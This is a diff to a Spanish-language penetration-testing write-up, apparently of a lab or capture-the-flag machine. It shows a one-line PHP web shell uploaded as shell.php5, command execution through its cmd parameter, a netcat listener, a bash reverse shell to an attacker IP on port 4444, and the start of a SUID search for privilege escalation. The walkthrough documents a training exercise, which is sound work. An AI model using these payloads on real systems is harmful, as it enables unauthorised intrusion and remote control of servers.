@@ -100,18 +100,62 @@ El payload utilizado permite ejecutar comandos del sistema a través de parámet
 <?php system($_GET['cmd']); ?>
 ```
 
-Este tipo de payload es comúnmente utilizado en pruebas de seguridad para obtener ejecución remota de comandos (RCE). Referencias como PentestMonkey - PHP Reverse Shell
+Este tipo de payload es comúnmente utilizado en pruebas de seguridad para obtener ejecución remota de comandos (RCE). Referencias como [PentestMonkey - PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
  fueron utilizadas como guía.
 
+![Web Shell Creation](9.png)
+
+Una vez subido el archivo, se accedió al mismo desde el navegador utilizando el parámetro `cmd` para ejecutar comandos del sistema.
+
+![Command Execution](10.png)
+
+Como se puede observar, el servidor ejecuta el comando `id`, devolviendo información del usuario bajo el cual se ejecuta el servicio web (**www-data**).
+
+También se probaron otros comandos como `ls` y `pwd`, confirmando el control sobre el sistema.
+
+Tras lograr la ejecución remota de comandos, el siguiente objetivo fue obtener una shell interactiva en el sistema.
+
+Para ello, se configuró un listener en la máquina atacante utilizando Netcat:
+
+```bash
+nc -lvnp 4444
+```
+
+Una vez configurado el listener, se utilizó un payload de reverse shell para establecer una conexión desde la máquina víctima hacia la máquina atacante.
+
+El payload fue ejecutado a través del parámetro `cmd` en la web shell previamente subida:
+
+```bash
+http://10.128.172.51/uploads/shell.php5?cmd=bash -c 'bash -i >& /dev/tcp/10.128.118.127/4444 0>&1'
+```
+Este tipo de payload es ampliamente utilizado en pruebas de penetración y puede encontrarse en recursos como [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet).
+
+![Reverse Shell Execution](15.png)
+
+Este comando instruye al servidor a iniciar una conexión hacia la máquina atacante en el puerto 4444, proporcionando una shell interactiva.
+
+Al ejecutarse correctamente, se obtiene acceso remoto al sistema comprometido desde la máquina atacante.
+
+Una vez ejecutado el payload, se recibió una conexión entrante en el listener configurado previamente:
+
+![Reverse Shell Connection](16.png)
+
+Como se puede observar, se establece una conexión desde la máquina víctima hacia la máquina atacante, obteniendo una shell como el usuario **www-data**.
+
+Aunque la shell obtenida es básica (sin control total del terminal), permite ejecutar comandos directamente en el sistema comprometido.
+
+Este tipo de shell es conocida como *non-interactive shell*, por lo que puede presentar limitaciones en su uso.
 
 
+## Privilege Escalation
 
+Una vez obtenida una shell como el usuario **www-data**, el siguiente objetivo fue escalar privilegios para obtener acceso como **root**.
 
+Para ello, se buscaron archivos con permisos SUID en el sistema.
 
-
-
-
-
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
 
 
 
